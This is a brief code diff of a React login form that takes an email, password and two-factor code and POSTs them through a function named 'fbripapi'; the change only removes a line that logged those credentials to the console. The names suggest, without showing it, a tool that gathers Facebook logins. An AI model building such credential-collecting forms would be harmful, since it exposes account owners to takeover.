@@ -16,8 +16,7 @@ export default function LoginForm() {
   const [twofactor, setTwofactor] = useState('')
   const account = useContext(FacebookAuthContext)
   
-  async function loginAction() {
-    console.log(email, password, twofactor); 
+  async function loginAction() { 
     const result = await fbripapi({
       method: 'POST',
       data: { email, password, twofactor },
